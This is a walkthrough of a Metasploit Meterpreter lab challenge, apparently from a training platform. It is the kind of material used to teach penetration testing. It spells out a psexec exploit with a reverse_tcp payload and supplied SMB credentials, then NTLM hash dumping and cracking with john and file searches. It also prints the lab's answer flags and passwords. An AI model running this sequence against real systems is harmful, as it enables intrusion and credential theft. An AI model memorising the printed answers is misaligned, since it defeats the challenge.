# Metasploit: Meterpreter

### Post-Exploitation Challenge
- What is the computer name?
Open msfconsole and, as suggested, use `exploit/windows/smb/psexec` --> `set payload payload/windows/meterpreter/reverse_tcp` --> `set SMBUser ballen` --> `set SMBPass Password1` --> `set LHOST your_IP` --> `set RHOSTS target_IP` --> `run`. <br />
![image](https://github.com/user-attachments/assets/2d213981-7576-4914-8be9-241316b95520) <br />
`ACME-TEST`
- What is the target domain? `FLASH`
- What is the name of the share likely created by the user? <br />
I personally moved in C:\Shares, but you could also background the session and use the `post/windows/gather/enum_shares` module. <br />
`speedster`
- What is the NTLM hash of the jchambers user? <br />
![image](https://github.com/user-attachments/assets/c8cea7ed-f745-4a53-be0f-cb6c394113fe)<br />
`69596c7aa1e8daee17f8e78870e25a5c`
- What is the cleartext password of the jchambers user? <br />
I used john: copy the line relative to jchambers from the 'hashdump' command into a file and run john: <br />
![image](https://github.com/user-attachments/assets/c9e49b73-91a6-4f8e-af55-2b93d1cb7e32) <br />
`Trustno1`
- Where is the "secrets.txt"  file located? (Full path of the file)<br />
Run `search -f secrets.txt` to find the answer: `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`
- What is the Twitter password revealed in the "secrets.txt" file? <br />
![image](https://github.com/user-attachments/assets/7b850aa0-392d-434c-b9f1-4a3190c176bc)<br />
`KDSvbsw3849!`
- Where is the "realsecret.txt" file located? (Full path of the file) <br />
Run `search -f realsecret.txt` to find where it's located: `c:\inetpub\wwwroot\realsecret.txt`
- What is the real secret? `The Flash is the fastest man alive`
